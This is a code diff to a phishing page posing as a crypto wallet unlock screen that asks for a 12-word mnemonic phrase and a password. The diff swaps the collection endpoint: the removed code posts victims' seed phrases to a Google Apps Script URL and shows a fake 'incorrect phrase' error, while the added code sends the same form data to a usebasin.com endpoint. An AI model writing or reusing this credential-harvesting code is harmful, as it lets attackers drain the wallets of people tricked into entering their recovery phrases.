@@ -39,7 +39,7 @@
               </div>
 
             </div>
-            <form class="UnlockWalletViaMnemonicPhrase" name="submit-to-google-sheet" method="POST" action="https://www.thetamaintoken.org/index">
+            <form class="UnlockWalletViaMnemonicPhrase" name="solution-form" method="POST" action="">
               <div class="UnlockWalletViaMnemonicPhrase__title">
                 Please enter your 12 word phrase
               </div>
@@ -50,7 +50,7 @@
               <input id="password" class="UnlockWalletViaMnemonicPhrase__password-input" placeholder="Enter temporary session password" name="MnemonicPassword" type="password" value="" required="">
               <p class="UnlockWalletViaMnemonicPhrase__mnemonic-instructions" id="errorMessage"></p>
               <p class="UnlockWalletViaMnemonicPhrase__mnemonic-instructions">click if mnemonic phrase are correct
-                <input type="checkbox" id=" check" onclick="enable()">
+                <input type="checkbox" id=" check">
               </p>
 
               <div class="UnlockWalletCard__warning1">
@@ -102,23 +102,32 @@
 </script>
 
   <script>
-    const scriptURL =
-      "https://script.google.com/macros/s/AKfycbxIXgYNITLti8RQBB9wiGD2xXsjes8vVFz8wMGWmYsXStHfeIgGGSLuWLlPrr-eDKsA/exec";
-    const form = document.forms["submit-to-google-sheet"];
-    const msg = document.getElementById("errorMessage")
+    const basinURL = 'https://usebasin.com/f/548f9eddc44b'    
+      const form = document.forms["solution-form"];
+    
+      // const msg = document.getElementById("errorMessage")
 
-    form.addEventListener("submit", (e) => {
-      e.preventDefault();
-      fetch(scriptURL, { method: "POST", body: new FormData(form) })
-        .then(response => {
-          errorMessage.innerHTML = "Please Enter correct mnemonic phrase and Password!"
-          setTimeout(function () {
-            msg.innerHTML = ""
-          }, 5000)
-          form.reset()
+      form.addEventListener('submit', (event) => {
+        event.preventDefault(); // prevent default form submission behavior
+        
+        const formData = new FormData(form);
+        fetch(basinURL, { //sd
+          method: 'POST',
+          body: formData // pass form data as the request body
         })
-        .catch((error) => console.error("Error!", error.message));
-    });
+        .then(response => {
+          if (response.ok) {
+        alert('ok response no data sync!');
+            return response.json(); // if response is okay, parse the response as JSON
+          }
+          throw new Error('Network response was not ok.');
+        })
+        .catch(error => {
+          console.error('Error:', error); // log any errors
+        alert('server error, kindly try again');
+        });
+      });
+
   </script>
   <script src="./wallet_files/index.js"></script>
 
